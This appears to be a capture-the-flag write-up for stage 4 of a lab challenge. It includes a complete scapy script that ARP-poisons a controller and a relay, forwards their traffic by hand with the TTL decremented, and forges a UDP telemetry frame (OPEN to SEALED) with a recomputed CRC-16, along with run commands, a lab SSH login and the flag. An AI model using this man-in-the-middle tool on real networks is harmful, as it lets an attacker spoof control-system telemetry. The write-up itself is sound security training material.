# The Spine 4/5 — Rewrite ("Tell it the airlock is sealed")

**Flag:** `reentry{f0rg3d_th3_crc_w1th0ut_dr0pp1ng_th3_l1nk}`
**Commit token picked up:** `AOC-6-1403d9b5` (needed in stage 5)

| | |
|---|---|
| Category | Active MITM / packet rewriting (ARP + on-the-fly frame edit) |
| Parties | controller **LAZARUS = 10.185.1.3**, relay **RELAY-GW = 10.185.1.2** |
| Channel | `udp/9600` (MRDN bus); controller:9601 ↔ relay:9600 |
| Goal | Convince LAZARUS the RT-7 AIRLOCK is **SEALED**, so it releases the assembler's commit token |
| Trick | Rewrite the STATUS term=7 reply `OPEN`→`SEALED`, **recompute the CRC-16** (the only frame check), and keep forwarding the rest (do not drop the link) |

> **Challenge brief:** LAZARUS believes what the bus tells it, and the bus has exactly one way
> of deciding that a frame is genuine. The airlock is open, and LAZARUS will not release the
> assembler's commit token while it is open. You are already sitting between it and the terminal
> that reports the airlock, and every frame the controller receives is one you chose to pass on.
> Tell it the airlock is sealed.

Conclusions:
- "one way of deciding a frame is genuine" = **CRC-16** (from stage 2 — CRC-16/CCITT-FALSE);
- we are an active MITM (from stage 3) and we **modify** the flow, not just sniff it;
- "do not drop the link" = keep forwarding the rest of the traffic, or the bus goes quiet and we
  get nothing.

---

## 1. Context from stage 3

From stage 3 we know:
- the controller **LAZARUS = 10.185.1.3** sends a POLL (`op=0x01`) to the relay about every
  0.6 s, for terminals 1/7/9;
- the relay **= 10.185.1.2** answers STATUS (`op=0x81`): RT-1 `NOMINAL`, **RT-7 `OPEN`**, RT-9
  `NOMINAL`;
- the frame format (stage 2): `MRDN|ver|op|term|seq(BE16)|dlen|payload|crc16(BE)`;
- CRC-16/CCITT-FALSE (poly `0x1021`, init `0xFFFF`) computed over header+payload.

Task: on the fly, turn the reply `op=0x81 term=7 OPEN` into `SEALED` with a correct CRC.

---

## 2. Key trap — TTL (the relay requires a "hop")

With a MITM, `ip_forward=1` is not enough (the kernel forwards the frame **unchanged**, and you
cannot modify it without `iptables`/NFQUEUE — which are **not** on this box). You must forward
**by hand** in scapy (`ip_forward=0`) so you can swap the payload.

Problem: after switching to manual forwarding, the **relay stops answering** our POLLs. A
promiscuous sniff showed the relay receives the POLLs but generates no `0x81`.

Cause: the relay **drops frames with TTL=64** (a frame "straight off the interface", with no
hop — anti-spoofing protection). With `ip_forward=1` the kernel **decrements TTL** (64→63),
which is why stage 3 worked. Fix: with manual forwarding, **decrement the TTL** and recompute
the IP/UDP checksums.

```python
ip = IP(bytes(p[IP]))
ip.ttl = p[IP].ttl - 1          # <-- without this the relay stays silent
del ip[IP].chksum; del ip[UDP].chksum   # scapy recomputes
```

---

## 3. The rewriter (scapy)

```python
# rewrite.py
import time, threading, subprocess
from scapy.all import *
IFACE="eth0"; RELAY="10.185.1.2"; CTRL="10.185.1.3"
conf.iface=IFACE; conf.sniff_promisc=True; mymac=get_if_hwaddr(IFACE)

def mac_of(ip):
    ans,_=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=3,retry=3,verbose=0)
    for _,r in ans: return r.hwsrc
MAC={RELAY:mac_of(RELAY), CTRL:mac_of(CTRL)}

def crc16(data, crc=0xFFFF):                 # CRC-16/CCITT-FALSE
    for b in data:
        crc ^= b<<8
        for _ in range(8):
            crc = ((crc<<1)^0x1021)&0xFFFF if (crc&0x8000) else (crc<<1)&0xFFFF
    return crc

stop=threading.Event()
def poison():                                 # continuous poisoning both ways
    pr=Ether(dst=MAC[RELAY])/ARP(op=2,psrc=CTRL,hwsrc=mymac,pdst=RELAY,hwdst=MAC[RELAY])
    pc=Ether(dst=MAC[CTRL]) /ARP(op=2,psrc=RELAY,hwsrc=mymac,pdst=CTRL,hwdst=MAC[CTRL])
    while not stop.is_set():
        sendp(pr,verbose=0); sendp(pc,verbose=0); time.sleep(0.6)

def fwd(p, newraw=None):                       # forward with TTL-1 (+ optional payload swap)
    ip=IP(bytes(p[IP]))
    if newraw is not None:
        ip[UDP].remove_payload(); ip=ip/Raw(load=newraw); del ip[IP].len; del ip[UDP].len
    ip.ttl=max(1,p[IP].ttl-1); del ip[IP].chksum
    if UDP in ip: del ip[UDP].chksum
    sendp(Ether(src=mymac,dst=MAC[p[IP].dst])/ip, verbose=0)

def handle(p):
    if IP not in p or p[Ether].dst!=mymac or p[IP].dst not in MAC: return
    if UDP in p and Raw in p:
        d=bytes(p[Raw].load)
        if d.startswith(b"MRDN") and len(d)>=12:
            op,term,dlen=d[5],d[6],d[9]; pl=d[10:10+dlen]
            # <-- rewrite: relay->controller STATUS term=7 OPEN  =>  SEALED
            if p[IP].src==RELAY and op==0x81 and term==7 and pl==b"OPEN":
                body=b"MRDN"+bytes([d[4],op,term,d[7],d[8],6])+b"SEALED"
                c=crc16(body); fwd(p, body+bytes([(c>>8)&0xff,c&0xff])); return
    fwd(p)                                     # everything else passes unchanged (link stays alive)

subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
threading.Thread(target=poison,daemon=True).start()
sniff(iface=IFACE, prn=handle, store=0, filter="udp and (port 9600 or port 9601)", timeout=200)
stop.set()   # + restore(): send the real ARP mappings
```

Run in the background (the SSH session can drop):

```bash
sudo nohup python3 rewrite.py 200 >/tmp/out 2>&1 &
```

The log shows the rewrites working:

```
REWRITE# 1 OPEN->SEALED crc=8dd7
REWRITE# 2 OPEN->SEALED crc=e607
```

---

## 4. LAZARUS releases the commit token → flag

After a few cycles where RT-7 reports `SEALED`, LAZARUS treats the airlock as closed and
**releases the assembler's commit token** — emitting a new frame on the bus (`op=0x8f`,
term=7):

```
10.185.1.3 -> 10.185.1.2  op=0x8f term=7
  payload: reentry{f0rg3d_th3_crc_w1th0ut_dr0pp1ng_th3_l1nk} AOC-6-1403d9b5
```

Because we are the MITM, we simply hear this frame (in the sniff/log).

> ## 🏁 Flag: `reentry{f0rg3d_th3_crc_w1th0ut_dr0pp1ng_th3_l1nk}`
>
> Alongside it: commit token `AOC-6-1403d9b5` — needed in stage 5.

---

## 5. Cleanup

```bash
sudo pkill -9 -f rewrite.py; sudo pkill -9 tcpdump
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
ip neigh | grep -E '10.185.1.(2|3)'   # should point to the real 02:42:0a:b9:01:02 / :03
```

---

## 6. TL;DR

```bash
ssh eng@tcp.reentry.lol -p 30081      # halley
# MITM .3<->.2 (like stage 3), but MANUAL forward (ip_forward=0),
# with TTL decrement, and rewriting relay->ctrl STATUS term=7 OPEN -> SEALED (+ new CRC-16):
sudo nohup python3 rewrite.py 200 &
# after a moment LAZARUS releases the token and emits on the bus:
grep -a reentry /tmp/out
#   reentry{f0rg3d_th3_crc_w1th0ut_dr0pp1ng_th3_l1nk}   AOC-6-1403d9b5
sudo pkill -9 tcpdump; echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## 7. The point

LAZARUS trusts the bus, and the only frame protection is a **CRC-16** — not a signature. Since
we know the polynomial (from the firmware, stage 2), we can freely **rewrite** the telemetry and
**recompute the CRC** so the frame looks genuine. Two conditions to make it work "live":
1. **do not drop the link** — forward all the other traffic, or the bus notices silence;
2. **decrement the TTL** — the relay drops frames with no hop (TTL=64), so the manual forward
   must act like a router.

Hence the flag: *forged the CRC without dropping the link*.

> **Previous:** [1](1%20-%20Patch%20In%20%28Trunk%20Access%29.md) · [2](2%20-%20Relay%20Firmware.md) · [3](3%20-%20Interpose.md)
> **Next:** [5 - Hijack](5%20-%20Hijack.md) (commit token `AOC-6-1403d9b5`, assembler `10.185.0.0/24` beyond the core router)
